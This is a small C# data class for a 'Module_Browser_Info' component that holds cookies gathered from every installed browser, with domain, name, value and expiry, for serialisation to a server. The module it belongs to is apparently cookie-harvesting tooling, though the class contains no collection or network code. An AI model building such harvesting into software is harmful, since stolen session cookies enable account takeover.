using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Module_Browser_Info.Response
{
    /// <summary>
    /// node for get cookie list from all browser used on Module_Browser_Info main class and serialized for server
    /// </summary>
    public class OnGetAllBrowserCookiesResponse
    {
        /// <summary>
        /// The list of browser cookies
        /// </summary>
        public List<CookieInfo> browsercookies = new List<CookieInfo>();
        /// <summary>
        /// class is involved the browser cookie node(baseDomain,name,value,expiry,creationTime,lastAccessed)  and target browser
        /// </summary>
        public class CookieInfo
        {
            public string TargetBrowserName;
            public BrowserCookie_Node CookieNode;
        }
        /// <summary>
        /// The errors if happened
        /// </summary>
        public Utils._s_Utils_ErrosHandling Errors = new Utils._s_Utils_ErrosHandling();
    }
}
